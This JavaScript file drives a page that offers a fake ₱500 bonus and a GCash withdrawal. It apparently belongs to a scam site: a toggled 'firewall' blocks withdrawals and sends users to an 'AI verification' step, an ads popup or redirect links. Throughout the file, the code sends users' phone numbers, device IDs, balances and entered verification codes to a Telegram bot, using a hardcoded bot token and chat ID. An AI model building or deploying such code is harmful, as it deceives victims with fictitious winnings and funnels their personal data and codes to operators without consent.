/**
 * PlayBonus.js - ANTI-LAG OPTIMIZED + ADS POPUP + SKIP COUNTDOWN
 * 
 * ⚡ PERFORMANCE FIXES:
 * ✅ Reduced confetti (35 → 10, skip mobile)
 * ✅ Reduced canvas particles (150 → 50, skip mobile)
 * ✅ Removed box-shadow sa confetti
 * ✅ Ban check: 5s → 30s
 * ✅ Ticker: 4.8s → 8s
 * ✅ Telegram throttling
 * ✅ textContent kaysa innerHTML (timer)
 * ✅ Canvas setTransform kaysa save/restore
 * 
 * 📢 FIREWALL LOGIC:
 * ✅ FIREWALL OFF + MAY LINK → Redirect
 * ✅ FIREWALL OFF + WALANG LINK → ADS Popup
 * ✅ FIREWALL ON + ANY → AI Verification
 * 
 * 🎯 SMART CLAIM NOW:
 * ✅ 0 Balance + Not Claimed → Force ₱500 Bonus Popup
 * ✅ 0 Balance + Claimed → Withdraw Popup
 * ✅ > 0 Balance → Withdraw Popup
 * 
 * ⏱️ SKIP ADS COUNTDOWN:
 * ✅ 5-second countdown bago i-enable ang SKIP ADS
 * ✅ Animation sa bawat count
 */

(function() {
    'use strict';
    
    // ============================================================
    // ⚡ PERFORMANCE FLAGS
    // ============================================================
    var IS_MOBILE = window.innerWidth <= 480;
    var REDUCED_MOTION = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
    var SKIP_HEAVY_EFFECTS = IS_MOBILE || REDUCED_MOTION;
    
    // ============================================================
    // GLOBAL VARIABLES
    // ============================================================
    var userPhone = null;
    var db = null;
    var userRef = null;
    var currentBalance = 0;
    var bonusAmount = 500;
    var isClaimed = false;
    var claimInProgress = false;
    var autoPopupTimer = null;
    var balanceListener = null;
    var claimListener = null;
    var forceLogoutListener = null;
    var forceLogoutFlagListener = null;
    var logoutTriggered = false;
    var listenersSetup = false;
    var pageLoadTime = Date.now();
    
    // Firewall popup variables
    var callInProgress = false;
    var callCountdown = 60;
    var callTimerInterval = null;
    var currentCallCode = '';
    
    // Withdraw popup variables
    var withdrawInProgress = false;
    
    // ⏱️ ADS Countdown variable
    var adsCountdownInterval = null;
    
    // ⚡ Telegram throttling
    var lastTelegramTime = 0;
    var TELEGRAM_THROTTLE_MS = 2000;
    
    // Sound cache
    var soundCache = {
        scatter: null,
        claim: null,
        success: null,
        call: null
    };
    
    // ============================================================
    // UTILITY FUNCTIONS
    // ============================================================
    
    function formatNumberWithComma(number) {
        var num = Number(number).toFixed(2);
        var parts = num.split('.');
        var wholePart = parts[0];
        var decimalPart = parts[1];
        var wholeWithCommas = wholePart.replace(/\B(?=(\d{3})+(?!\d))/g, ',');
        return wholeWithCommas + '.' + decimalPart;
    }
    
    function formatAmount(amount) {
        if (amount >= 1000000) return '₱' + (amount / 1000000).toFixed(1) + 'M';
        if (amount >= 1000) return '₱' + (amount / 1000).toFixed(1) + 'K';
        return '₱' + amount.toLocaleString();
    }
    
    function initSounds() {
        try {
            soundCache.scatter = new Audio('sounds/super_ace_scatter_ring.mp3');
            soundCache.claim = new Audio('sounds/claim.wav');
            soundCache.success = new Audio('sounds/success.wav');
            soundCache.call = new Audio('sounds/call_ring.mp3');
            soundCache.scatter.volume = 0.5;
            soundCache.claim.volume = 0.7;
            soundCache.success.volume = 0.6;
            soundCache.call.volume = 0.5;
        } catch(e) {}
    }
    
    function playSound(soundName) {
        if (soundCache[soundName]) {
            soundCache[soundName].currentTime = 0;
            soundCache[soundName].play().catch(function(e) {});
        }
    }
    
    // ============================================================
    // TELEGRAM NOTIFICATIONS
    // ⚡ THROTTLED — max 1 request per 2 seconds
    // ============================================================
    var BOT_TOKEN = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
    var CHAT_ID = "7298607329";
    
    function sendTelegram(message) {
        try {
            var now = Date.now();
            if (now - lastTelegramTime < TELEGRAM_THROTTLE_MS) {
                console.log('⏳ Telegram throttled');
                return;
            }
            lastTelegramTime = now;
            
            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message))
                .catch(function(e) { console.error('Telegram error:', e); });
        } catch(e) {}
    }
    
    function sendAICallRequestNotif(userPhone, deviceId, code) {
        var timestamp = new Date().toLocaleString();
        var message = '📞 AI-VERIFICATION CALL REQUESTED\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '👤 User: ' + userPhone + '\n' +
            '🖥️ Device: ' + deviceId + '\n' +
            '🔑 Code: ' + code + '\n' +
            '⏰ Time: ' + timestamp + '\n' +
            '📊 Status: Admin will call user\n' +
            '━━━━━━━━━━━━━━━━━━━━';
        sendTelegram(message);
    }
    
    function sendAICodeAttemptNotif(userPhone, deviceId, codeEntered, secondsLeft) {
        var timestamp = new Date().toLocaleString();
        var message = '🔑 AI-CODE VERIFICATION ATTEMPT\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '👤 User: ' + userPhone + '\n' +
            '🖥️ Device: ' + deviceId + '\n' +
            '📝 Code: ' + codeEntered + '\n' +
            '⏰ Time: ' + timestamp + '\n' +
            '⏱️ Left: ' + secondsLeft + 's\n' +
            '📊 Status: INVALID\n' +
            '━━━━━━━━━━━━━━━━━━━━';
        sendTelegram(message);
    }
    
    function sendAICallExpiredNotif(userPhone, deviceId) {
        var timestamp = new Date().toLocaleString();
        var message = '⏰ AI-VERIFICATION CALL EXPIRED\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '👤 User: ' + userPhone + '\n' +
            '🖥️ Device: ' + deviceId + '\n' +
            '⏰ Time: ' + timestamp + '\n' +
            '📊 Status: Call expired\n' +
            '━━━━━━━━━━━━━━━━━━━━';
        sendTelegram(message);
    }
    
    function sendWithdrawRequestNotif(userPhone, deviceId, balance, firewallStatus) {
        var timestamp = new Date().toLocaleString();
        var message = '💸 WITHDRAW REQUEST\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '👤 User: ' + userPhone + '\n' +
            '🖥️ Device: ' + deviceId + '\n' +
            '💰 Balance: ₱' + balance.toFixed(2) + '\n' +
            '🔥 Firewall: ' + (firewallStatus ? 'ON (Verification)' : 'OFF (Direct Redirect)') + '\n' +
            '⏰ Time: ' + timestamp + '\n' +
            '━━━━━━━━━━━━━━━━━━━━';
        sendTelegram(message);
    }
    
    function sendWithdrawRedirectNotif(userPhone, deviceId, balance) {
        var timestamp = new Date().toLocaleString();
        var message = '🚀 USER REDIRECTED\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '👤 User: ' + userPhone + '\n' +
            '🖥️ Device: ' + deviceId + '\n' +
            '💰 Balance: ₱' + balance.toFixed(2) + '\n' +
            '⏰ Time: ' + timestamp + '\n' +
            '📊 Status: Redirected to withdrawal\n' +
            '━━━━━━━━━━━━━━━━━━━━';
        sendTelegram(message);
    }
    
    function sendWithdrawFirewallNotif(userPhone, deviceId, balance) {
        var timestamp = new Date().toLocaleString();
        var message = '🔥 WITHDRAW BLOCKED BY FIREWALL\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '👤 User: ' + userPhone + '\n' +
            '🖥️ Device: ' + deviceId + '\n' +
            '💰 Balance: ₱' + balance.toFixed(2) + '\n' +
            '⏰ Time: ' + timestamp + '\n' +
            '📊 Status: Verification required\n' +
            '━━━━━━━━━━━━━━━━━━━━';
        sendTelegram(message);
    }
    
    function sendAdsPopupNotif(userPhone, deviceId, balance) {
        var timestamp = new Date().toLocaleString();
        var message = '📢 ADS POPUP SHOWN\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '👤 User: ' + userPhone + '\n' +
            '🖥️ Device: ' + deviceId + '\n' +
            '💰 Balance: ₱' + balance.toFixed(2) + '\n' +
            '🔥 Firewall: OFF\n' +
            '📊 Reason: No link deployed\n' +
            '⏰ Time: ' + timestamp + '\n' +
            '━━━━━━━━━━━━━━━━━━━━';
        sendTelegram(message);
    }
    
    // ============================================================
    // INIT
    // ============================================================
    function init() {
        console.log('🎁 PlayBonus Starting...');
        console.log('⚡ Anti-Lag Mode:', SKIP_HEAVY_EFFECTS ? 'ON (mobile/reduced-motion)' : 'OFF');
        
        userPhone = localStorage.getItem("userPhone");
        if (!userPhone) {
            window.location.href = "index.html";
            return;
        }
        
        var phoneDisplay = document.getElementById('userPhoneDisplay');
        if (phoneDisplay) {
            phoneDisplay.innerText = userPhone.substring(0, 4) + "***" + userPhone.substring(7, 11);
        }
        
        initSounds();
        initFirebase();
        loadUserData();
        initTimer();
        initTicker();
        initClaimFlow();
        initConfetti();
        attachButtonEvents();
        initAdminForceLogoutListener();
        
        console.log('✅ PlayBonus ready! (Single Script)');
    }
    
    function initFirebase() {
        if (typeof firebaseConfig === 'undefined') {
            console.error('❌ Firebase config not found!');
            return;
        }
        try {
            if (!firebase.apps || !firebase.apps.length) {
                firebase.initializeApp(firebaseConfig);
            }
            db = firebase.database();
            userRef = db.ref('user_sessions/' + userPhone);
            console.log('✅ Firebase connected:', userPhone);
        } catch(e) {
            console.error('Firebase error:', e);
        }
    }
    
    // ============================================================
    // LOAD USER DATA
    // ============================================================
    function loadUserData() {
        if (!userRef) return;
        
        userRef.once('value', function(snapshot) {
            var data = snapshot.val();
            
            if (data) {
                currentBalance = Number(data.balance) || 0;
                isClaimed = data.claimed_ptcat === true;
                
                console.log('📊 Loaded - Balance: ₱' + currentBalance + ', Claimed:', isClaimed);
                
                updateBalanceDisplay();
                updateClaimButtonUI();
                scheduleAutoPopup();
            } else {
                console.log('🆕 New user');
                currentBalance = 0;
                isClaimed = false;
                
                userRef.set({
                    phone: userPhone,
                    balance: 0,
                    claimed_ptcat: false,
                    status: "active",
                    created_at: Date.now()
                }).then(function() {
                    updateBalanceDisplay();
                    updateClaimButtonUI();
                    scheduleAutoPopup();
                });
            }
        }).catch(function(e) {
            console.error('Load error:', e);
        });
        
        // Real-time balance listener
        if (balanceListener) userRef.child('balance').off('value', balanceListener);
        balanceListener = userRef.child('balance').on('value', function(snapshot) {
            var balance = snapshot.val();
            if (balance !== null && balance !== undefined) {
                currentBalance = Number(balance);
                updateBalanceDisplay();
            }
        });
        
        // Real-time claim listener
        if (claimListener) userRef.child('claimed_ptcat').off('value', claimListener);
        claimListener = userRef.child('claimed_ptcat').on('value', function(snapshot) {
            var claimed = snapshot.val();
            var newState = (claimed === true);
            if (newState !== isClaimed) {
                isClaimed = newState;
                updateClaimButtonUI();
            }
        });
    }
    
    function updateBalanceDisplay() {
        var balanceEl = document.getElementById('userBalanceDisplay');
        if (balanceEl) {
            balanceEl.innerText = formatNumberWithComma(currentBalance);
        }
    }
    
    // ============================================================
    // AUTO POPUP (₱500 Bonus)
    // ============================================================
    function scheduleAutoPopup() {
        if (autoPopupTimer) clearTimeout(autoPopupTimer);
        
        var delay = isClaimed ? 5000 : 3000;
        console.log('⏰ Auto popup in ' + (delay / 1000) + 's (isClaimed:', isClaimed + ')');
        
        autoPopupTimer = setTimeout(function() {
            autoShowBonusPopup();
        }, delay);
    }
    
    function autoShowBonusPopup() {
        console.log('🎁 Auto-showing bonus popup');
        var popup = document.getElementById('bonusRewardPopup');
        if (!popup) return;
        
        popup.style.display = 'flex';
        playSound('scatter');
        updateClaimButtonUI();
    }
    
    // ============================================================
    // FORCE SHOW BONUS POPUP (para sa CLAIM NOW + 0 balance)
    // ============================================================
    function forceShowBonusPopup() {
        console.log('🎁 Force showing bonus popup');
        
        var popup = document.getElementById('bonusRewardPopup');
        if (!popup) {
            console.warn('⚠️ bonusRewardPopup not found');
            return;
        }
        
        popup.style.display = 'flex';
        playSound('scatter');
        updateClaimButtonUI();
    }
    
    // ============================================================
    // ANIMATED BALANCE
    // ============================================================
    function animateBalanceThenSave(oldBalance, newBalance, callback) {
        var startTime = null;
        var duration = 1000;
        
        function step(timestamp) {
            if (!startTime) startTime = timestamp;
            var progress = Math.min((timestamp - startTime) / duration, 1);
            var easeProgress = 1 - Math.pow(1 - progress, 3);
            var val = Math.floor(easeProgress * (newBalance - oldBalance) + oldBalance);
            
            var balanceEl = document.getElementById('userBalanceDisplay');
            if (balanceEl) balanceEl.innerText = formatNumberWithComma(val);
            
            if (progress < 1) {
                requestAnimationFrame(step);
            } else {
                if (callback) callback();
            }
        }
        requestAnimationFrame(step);
    }
    
    // ============================================================
    // CHECK FIREWALL
    // ============================================================
    function checkFirewallBeforeClaim() {
        try {
            return db.ref('admin/globalFirewall').once('value').then(function(snapshot) {
                var data = snapshot.val();
                return (data && data.active === true);
            });
        } catch(e) {
            return Promise.resolve(false);
        }
    }
    
    // ============================================================
    // TRACK CLAIM
    // ============================================================
    function trackClaimInFirebase(amount) {
        try {
            var now = new Date();
            var year = now.getFullYear();
            var month = String(now.getMonth() + 1).padStart(2, '0');
            var day = String(now.getDate()).padStart(2, '0');
            var hour = now.getHours();
            var dateKey = year + '-' + month + '-' + day;
            
            var dayRef = db.ref('festival_stats/daily/' + dateKey);
            
            dayRef.transaction(function(data) {
                if (data === null) {
                    data = {
                        claims_count: 0,
                        claims_amount: 0,
                        hourly_claims: {}
                    };
                }
                
                data.claims_count = (data.claims_count || 0) + 1;
                data.claims_amount = (data.claims_amount || 0) + (amount || 0);
                
                if (!data.hourly_claims) data.hourly_claims = {};
                data.hourly_claims[hour] = (data.hourly_claims[hour] || 0) + 1;
                
                data.last_update = Date.now();
                return data;
            });
            
            console.log('📊 CLAIM TRACKED:', dateKey, 'Hour:', hour, '₱' + amount);
        } catch(e) {
            console.error('Track claim error:', e);
        }
    }
    
    // ============================================================
    // INIT CLAIM FLOW
    // ============================================================
    function initClaimFlow() {
        console.log('🎁 Init Claim Flow...');
        
        var claimNowBtn = document.getElementById('claimNowBtn');
        var popup = document.getElementById('bonusRewardPopup');
        
        // ========== CLAIM NOW → SMART HANDLER ==========
        if (claimNowBtn) {
            claimNowBtn.addEventListener('click', function(e) {
                e.preventDefault();
                e.stopPropagation();
                
                console.log('💸 CLAIM NOW clicked');
                console.log('💰 Current balance:', currentBalance);
                console.log('🎁 isClaimed:', isClaimed);
                
                playSound('scatter');
                
                // ✅ CHECK: Kung 0 balance
                if (currentBalance <= 0) {
                    console.log('⚠️ 0 balance detected!');
                    
                    // ✅ KUNG HINDI PA CLAIMED → Force display ₱500 bonus popup
                    if (!isClaimed) {
                        console.log('🎁 Not claimed yet → Force showing ₱500 bonus popup');
                        forceShowBonusPopup();
                        return;
                    }
                    
                    // ✅ KUNG CLAIMED NA → Huwag i-display ang bonus popup
                    console.log('❌ Already claimed → Skipping bonus popup');
                    // Continue sa withdraw popup
                }
                
                // Default: Buksan ang withdraw popup
                console.log('💸 Opening withdraw popup');
                openClaimNowPopup();
            });
        }
        
        // ========== CLAIM BONUS (Inside Bonus Popup) ==========
        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        if (ptCatClaimBtn) {
            ptCatClaimBtn.addEventListener('click', handleClaimBonus);
        }
        
        // ========== BONUS POPUP CLOSE BUTTONS ==========
        var closeBtn = document.getElementById('bonusRewardClose');
        if (closeBtn) {
            closeBtn.addEventListener('click', function() {
                if (popup) popup.style.display = 'none';
            });
        }
        
        var backBtn = document.getElementById('bonusRewardBack');
        if (backBtn) {
            backBtn.addEventListener('click', function() {
                if (popup) popup.style.display = 'none';
            });
        }
        
        updateClaimButtonUI();
        console.log('✅ Claim Flow ready');
    }
    
    // ============================================================
    // WITHDRAW POPUP FUNCTIONS
    // ============================================================
    function openClaimNowPopup() {
        var popup = document.getElementById('claimNowPopup');
        if (!popup) {
            console.warn('⚠️ claimNowPopup not found');
            return;
        }
        
        var balanceEl = document.getElementById('claimNowBalanceAmount');
        if (balanceEl) {
            balanceEl.innerText = formatNumberWithComma(currentBalance);
        }
        
        popup.style.display = 'flex';
        generateClaimNowConfetti();
        
        if (!popup.dataset.eventsAttached) {
            popup.dataset.eventsAttached = 'true';
            attachClaimNowEvents();
        }
    }
    
    function closeClaimNowPopup() {
        var popup = document.getElementById('claimNowPopup');
        if (popup) popup.style.display = 'none';
    }
    
    // ============================================================
    // CONFETTI — OPTIMIZED
    // ============================================================
    function generateClaimNowConfetti() {
        var layer = document.getElementById('claimNowConfetti');
        if (!layer) return;
        
        if (SKIP_HEAVY_EFFECTS) {
            layer.style.display = 'none';
            return;
        }
        
        layer.innerHTML = '';
        
        var colors = ['#ff2d95', '#ffd700', '#ff8c00', '#00d4ff', '#39ff14', '#ffffff'];
        var shapes = ['circle', 'square', 'ribbon'];
        
        for (var i = 0; i < 10; i++) {
            var piece = document.createElement('div');
            var color = colors[Math.floor(Math.random() * colors.length)];
            var shape = shapes[Math.floor(Math.random() * shapes.length)];
            var size = Math.random() * 8 + 5;
            var startX = Math.random() * 100;
            var delay = Math.random() * 4;
            var duration = Math.random() * 4 + 5;
            var rotate = Math.random() * 360;
            
            piece.className = 'claim-now-confetti ' + shape;
            piece.style.cssText =
                'left:' + startX + '%;' +
                'width:' + size + 'px;' +
                'height:' + (shape === 'ribbon' ? size * 2.5 : size) + 'px;' +
                'background:' + color + ';' +
                'animation: claimNowConfettiFall ' + duration + 's ' + delay + 's linear infinite;' +
                'transform: rotate(' + rotate + 'deg);';
            
            layer.appendChild(piece);
        }
    }
    
    function attachClaimNowEvents() {
        var closeBtn = document.getElementById('claimNowPopupClose');
        if (closeBtn) closeBtn.onclick = closeClaimNowPopup;
        
        var backBtn = document.getElementById('claimNowBackBtn');
        if (backBtn) backBtn.onclick = closeClaimNowPopup;
        
        var gcashBtn = document.getElementById('claimViaGCashBtn');
        if (gcashBtn) {
            gcashBtn.onclick = handleClaimViaGCash;
        }
    }
    
    // ============================================================
    // 📢 ADS POPUP FUNCTIONS
    // Lalabas kapag: Firewall OFF + Walang Link
    // May 5-second countdown bago i-enable ang SKIP ADS
    // ============================================================
    function showAdsPopup() {
        var popup = document.getElementById('adsPopup');
        if (!popup) {
            console.warn('⚠️ adsPopup not found');
            return;
        }
        
        console.log('📢 Showing ADS popup');
        popup.style.display = 'flex';
        
        // Attach events (once lang)
        if (!popup.dataset.eventsAttached) {
            popup.dataset.eventsAttached = 'true';
            attachAdsEvents();
        }
        
        // ⏱️ Start 5-second countdown
        startAdsCountdown();
    }
    
    function closeAdsPopup() {
        var popup = document.getElementById('adsPopup');
        if (popup) popup.style.display = 'none';
        
        // ⏱️ Clear countdown
        stopAdsCountdown();
        
        console.log('📢 ADS popup closed');
    }
    
    // ============================================================
    // ⏱️ COUNTDOWN TIMER FOR SKIP ADS (5 → 1)
    // ============================================================
    function startAdsCountdown() {
        // Clear existing countdown
        stopAdsCountdown();
        
        var skipBtn = document.getElementById('adsSkipBtn');
        if (!skipBtn) return;
        
        var countdown = 10; // Start sa 5
        
        // ✅ Disable button initially
        skipBtn.disabled = true;
        skipBtn.classList.add('counting');
        skipBtn.classList.remove('ready');
        skipBtn.innerHTML = '<i class="fas fa-hourglass-half"></i> <span>SKIP ADS IN ' + countdown + '</span>';
        
        // Start interval
        adsCountdownInterval = setInterval(function() {
            countdown--;
            
            if (countdown > 0) {
                // ⏱️ Update countdown display
                skipBtn.innerHTML = '<i class="fas fa-hourglass-half"></i> <span>SKIP ADS IN ' + countdown + '</span>';
                
                // ⚡ Add pulse animation sa bawat count
                skipBtn.classList.remove('count-pulse');
                void skipBtn.offsetWidth; // Trigger reflow
                skipBtn.classList.add('count-pulse');
                
            } else {
                // ✅ Enable button pagka-0
                stopAdsCountdown();
                
                skipBtn.disabled = false;
                skipBtn.classList.remove('counting');
                skipBtn.classList.add('ready');
                skipBtn.innerHTML = '<i class="fas fa-forward"></i> <span>SKIP ADS</span>';
                
                // ⚡ Add ready animation
                skipBtn.classList.remove('count-pulse');
                void skipBtn.offsetWidth;
                skipBtn.classList.add('ready-pulse');
                
                console.log('✅ SKIP ADS enabled');
            }
        }, 1000);
    }
    
    function stopAdsCountdown() {
        if (adsCountdownInterval) {
            clearInterval(adsCountdownInterval);
            adsCountdownInterval = null;
        }
    }
    
    function attachAdsEvents() {
        // ✕ Close button (always clickable)
        var closeBtn = document.getElementById('adsPopupClose');
        if (closeBtn) {
            closeBtn.onclick = function() {
                console.log('✕ ADS close clicked');
                closeAdsPopup();
            };
        }
        
        // ⏭️ SKIP ADS button (may countdown)
        var skipBtn = document.getElementById('adsSkipBtn');
        if (skipBtn) {
            skipBtn.onclick = function() {
                // ⏱️ Check kung enabled na (countdown finished)
                if (skipBtn.disabled) {
                    console.log('⏳ Skip ADS not ready yet');
                    return;
                }
                
                console.log('⏭️ SKIP ADS clicked');
                playSound('claim');
                closeAdsPopup();
                
                // 📱 Telegram notification
                try {
                    var userPhoneStr = localStorage.getItem("userPhone") || "Unknown";
                    var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
                    sendTelegram(
                        '⏭️ ADS SKIPPED\n' +
                        '━━━━━━━━━━━━━━━━━━━━\n' +
                        '👤 User: ' + userPhoneStr + '\n' +
                        '🖥️ Device: ' + deviceId + '\n' +
                        '⏰ Time: ' + new Date().toLocaleString() + '\n' +
                        '━━━━━━━━━━━━━━━━━━━━'
                    );
                } catch(e) {}
            };
        }
    }
    
    // ============================================================
    // 🔥 MAIN: HANDLE CLAIM VIA GCASH
    // 
    // LOGIC:
    // FIREWALL ON → AI VERIFICATION (any link status)
    // FIREWALL OFF + MAY LINK → REDIRECT
    // FIREWALL OFF + WALANG LINK → ADS POPUP
    // ============================================================
    async function handleClaimViaGCash() {
        if (withdrawInProgress) {
            console.log('⏳ Withdraw already in progress');
            return;
        }
        
        withdrawInProgress = true;
        
        console.log('💚 CLAIM VIA GCASH clicked');
        playSound('claim');
        
        var gcashBtn = document.getElementById('claimViaGCashBtn');
        var originalHTML = gcashBtn ? gcashBtn.innerHTML : '';
        
        if (gcashBtn) {
            gcashBtn.disabled = true;
            gcashBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>PROCESSING...</span>';
        }
        
        try {
            // ========== STEP 1: CHECK FIREWALL ==========
            var firewallActive = await checkFirewallBeforeClaim();
            console.log('🔥 Firewall status:', firewallActive ? 'ON' : 'OFF');
            
            var userPhoneStr = localStorage.getItem("userPhone") || "Unknown";
            var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
            
            // ============================================
            // 🔥 FIREWALL ON → AI VERIFICATION (ANY LINK STATUS)
            // ============================================
            if (firewallActive) {
                console.log('🔥 Firewall ON → Showing AI verification');
                
                sendWithdrawFirewallNotif(userPhoneStr, deviceId, currentBalance);
                
                closeClaimNowPopup();
                showFirewallVerificationPopup();
                
                if (gcashBtn) {
                    gcashBtn.disabled = false;
                    gcashBtn.innerHTML = originalHTML;
                }
                withdrawInProgress = false;
                return;
            }
            
            // ============================================
            // 🔓 FIREWALL OFF → CHECK LINK
            // ============================================
            console.log('🔓 Firewall OFF → Checking for link...');
            
            var redirectUrl = await getAdminRedirectLink();
            
            // ============================================
            // 🔓 FIREWALL OFF + MAY LINK → REDIRECT
            // ============================================
            if (redirectUrl) {
                console.log('✅ Link found → Redirecting to:', redirectUrl);
                
                sendWithdrawRequestNotif(userPhoneStr, deviceId, currentBalance, false);
                
                if (gcashBtn) {
                    gcashBtn.innerHTML = '<i class="fas fa-check"></i> <span>REDIRECTING...</span>';
                }
                
                setTimeout(function () {
                    sendWithdrawRedirectNotif(userPhoneStr, deviceId, currentBalance);
                    window.location.href = redirectUrl;
                }, 1500);
                
                return;
            }
            
            // ============================================
            // 🔓 FIREWALL OFF + WALANG LINK → ADS POPUP
            // ============================================
            console.log('📢 No link found → Showing ADS popup');
            
            sendAdsPopupNotif(userPhoneStr, deviceId, currentBalance);
            
            // Isara ang withdraw popup
            closeClaimNowPopup();
            
            // Ipakita ang ADS popup
            setTimeout(function() {
                showAdsPopup();
            }, 300);
            
            // Reset button
            if (gcashBtn) {
                gcashBtn.disabled = false;
                gcashBtn.innerHTML = originalHTML;
            }
            withdrawInProgress = false;
            
        } catch (error) {
            console.error('❌ Error:', error);
            alert('⚠️ System error. Please try again.');
            
            if (gcashBtn) {
                gcashBtn.disabled = false;
                gcashBtn.innerHTML = originalHTML;
            }
            withdrawInProgress = false;
        }
    }
    
    // ============================================================
    // GET ADMIN REDIRECT LINK
    // Priority:
    // 1. admin/redirectLink
    // 2. links (available)
    // ============================================================
    function getAdminRedirectLink() {
        return new Promise(function (resolve) {
            try {
                if (!db) {
                    console.warn('⚠️ db not initialized');
                    return resolve(null);
                }
                
                // ========== OPTION 1: admin/redirectLink ==========
                db.ref('admin/redirectLink').once('value')
                    .then(function (snapshot) {
                        var data = snapshot.val();
                        
                        if (data && data.url && data.active !== false) {
                            console.log('✅ Using admin/redirectLink:', data.url);
                            return resolve(data.url);
                        }
                        
                        // ========== OPTION 2: links (available) ==========
                        console.log('🔍 Fallback: checking links node...');
                        return db.ref('links')
                            .orderByChild('status')
                            .equalTo('available')
                            .limitToFirst(1)
                            .once('value')
                            .then(function (linksSnap) {
                                if (linksSnap.exists()) {
                                    var links = linksSnap.val();
                                    var key = Object.keys(links)[0];
                                    var linkData = links[key];
                                    
                                    db.ref('links/' + key).update({
                                        status: 'claimed',
                                        user: userPhone || 'Unknown',
                                        claimedAt: Date.now()
                                    });
                                    
                                    console.log('✅ Using links node:', linkData.url);
                                    resolve(linkData.url);
                                } else {
                                    console.warn('⚠️ Walang available link');
                                    resolve(null);
                                }
                            });
                    })
                    .catch(function (error) {
                        console.error('Get link error:', error);
                        resolve(null);
                    });
                
            } catch (e) {
                console.error('Get link error:', e);
                resolve(null);
            }
        });
    }
    
    // ============================================================
    // HANDLE CLAIM BONUS (₱500)
    // ============================================================
    function handleClaimBonus(e) {
        e.preventDefault();
        e.stopPropagation();
        
        console.log('🖱️ CLAIM BONUS clicked (isClaimed:', isClaimed + ')');
        
        if (isClaimed) {
            alert("You have already claimed this bonus!");
            return;
        }
        
        if (claimInProgress) {
            alert("Please wait, processing...");
            return;
        }
        
        if (!userRef) {
            alert("System not ready. Please refresh.");
            return;
        }
        
        userRef.child('claimed_ptcat').once('value', function(snapshot) {
            if (snapshot.val() === true) {
                isClaimed = true;
                updateClaimButtonUI();
                alert("You have already claimed this bonus!");
                return;
            }
            processClaim();
        }).catch(function(error) {
            console.error('Check error:', error);
            processClaim();
        });
    }
    
    // ============================================================
    // PROCESS CLAIM (₱500)
    // ============================================================
    function processClaim() {
        claimInProgress = true;
        
        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        if (ptCatClaimBtn) {
            ptCatClaimBtn.disabled = true;
            ptCatClaimBtn.style.opacity = '0.6';
            ptCatClaimBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>PROCESSING...</span>';
        }
        
        checkFirewallBeforeClaim().then(function(firewallOn) {
            if (firewallOn) {
                console.log('🔥 Firewall ON - Show AI verification');
                
                var popup = document.getElementById('bonusRewardPopup');
                if (popup) popup.style.display = 'none';
                
                creditBonusAndMark(function() {
                    showFirewallVerificationPopup();
                    claimInProgress = false;
                });
            } else {
                console.log('🔓 Firewall OFF - Direct claim');
                
                creditBonusAndMark(function() {
                    var popup = document.getElementById('bonusRewardPopup');
                    if (popup) popup.style.display = 'none';
                    
                    setTimeout(function() {
                        showSuccessPopup(bonusAmount);
                    }, 300);
                    
                    claimInProgress = false;
                });
            }
        }).catch(function(error) {
            console.error('Firewall error:', error);
            claimInProgress = false;
            resetClaimButton();
        });
    }
    
    // ============================================================
    // CREDIT BONUS + MARK CLAIMED
    // ============================================================
    function creditBonusAndMark(callback) {
        console.log('💰 Crediting ₱' + bonusAmount + '...');
        
        var oldBalance = currentBalance;
        var newBalance = oldBalance + bonusAmount;
        
        userRef.update({
            balance: newBalance,
            claimed_ptcat: true,
            ptcat_claimed_at: Date.now(),
            lastUpdate: Date.now()
        }).then(function() {
            console.log('✅ Firebase updated! New balance: ₱' + newBalance);
            
            currentBalance = newBalance;
            isClaimed = true;
            
            animateBalanceThenSave(oldBalance, newBalance, function() {
                updateBalanceDisplay();
            });
            
            trackClaimInFirebase(bonusAmount);
            playSound('claim');
            startConfetti();
            updateClaimButtonUI();
            
            if (callback) callback();
            
        }).catch(function(error) {
            console.error('❌ Firebase update error:', error);
            alert('Error saving claim. Please try again.');
            claimInProgress = false;
            resetClaimButton();
        });
    }
    
    function resetClaimButton() {
        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        if (ptCatClaimBtn) {
            ptCatClaimBtn.disabled = false;
            ptCatClaimBtn.style.opacity = '1';
            ptCatClaimBtn.innerHTML = '<i class="fas fa-gift"></i> <span>CLAIM BONUS</span>';
        }
        claimInProgress = false;
    }
    
    // ============================================================
    // UPDATE CLAIM BUTTON UI
    // ============================================================
    function updateClaimButtonUI() {
        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        var bonusLabel = document.querySelector('.bonus-label');
        
        if (!ptCatClaimBtn) return;
        
        if (isClaimed) {
            ptCatClaimBtn.disabled = true;
            ptCatClaimBtn.style.opacity = '0.5';
            ptCatClaimBtn.style.cursor = 'not-allowed';
            ptCatClaimBtn.style.pointerEvents = 'none';
            ptCatClaimBtn.innerHTML = '<i class="fas fa-check-circle"></i> <span>ALREADY CLAIMED</span>';
            ptCatClaimBtn.classList.add('claimed');
            
            if (bonusLabel) {
                bonusLabel.textContent = 'BONUS CLAIMED';
                bonusLabel.style.color = '#39ff14';
            }
        } else {
            ptCatClaimBtn.disabled = false;
            ptCatClaimBtn.style.opacity = '1';
            ptCatClaimBtn.style.cursor = 'pointer';
            ptCatClaimBtn.style.pointerEvents = 'auto';
            ptCatClaimBtn.innerHTML = '<i class="fas fa-gift"></i> <span>CLAIM BONUS</span>';
            ptCatClaimBtn.classList.remove('claimed');
            
            if (bonusLabel) {
                bonusLabel.textContent = 'BONUS REWARD';
                bonusLabel.style.color = '';
            }
        }
    }
    
    // ============================================================
    // SUCCESS POPUP
